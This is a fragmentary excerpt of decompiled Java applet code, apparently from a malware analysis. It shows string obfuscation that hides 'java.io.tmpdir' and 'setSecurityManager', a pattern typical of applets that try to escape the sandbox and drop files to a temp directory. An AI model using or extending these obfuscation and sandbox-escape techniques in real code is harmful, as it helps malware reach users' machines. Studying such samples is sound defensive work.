...
public class Ooo extends Applet
{
    ...
    public void start() {
        super.start();
        try {
            String tdir = System.getProperty("jibbokb2avibbokb2a.iibbokb2o.tibbokb2mpibbokb2dibbokb2ir".replace("ibbokb2", ""));
    ...
    public Ooo() {
        ...
        this.Ecs();
        this.ok();
        final String methodName = "seddd2ftSecddd2furiddd2ftyMddd2fanagddd2fer".replace("ddd2f", "");
        this.Ecs();
        this.Ecs();
        this.ok();
